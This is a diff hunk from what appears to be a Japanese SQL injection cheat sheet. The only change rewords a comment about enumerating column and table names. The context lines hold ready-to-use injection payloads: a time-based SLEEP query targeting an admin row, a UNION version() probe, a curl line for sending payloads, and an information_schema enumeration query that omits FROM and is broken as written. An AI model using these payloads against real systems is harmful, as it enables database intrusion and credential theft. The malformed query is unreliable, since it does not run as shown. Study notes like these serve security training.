@@ -41,7 +41,7 @@ UNION SELECT SLEEP(5),2 from テーブル名 where カラム名='admin' and カ�
 1' and 1=0 union select version(),null,null,null;-- -
 curl <url> -d "<sql>;-- -" #コマンドラインからcurlでもできる
 
-//テーブル名：カラム名の列挙
+//テーブル名：カラムの名前とテーブル名をセットで列挙
 UNION SELECT column_name, table_name, null information_schema.columns;-- -
 
 //テーブル情報の列挙
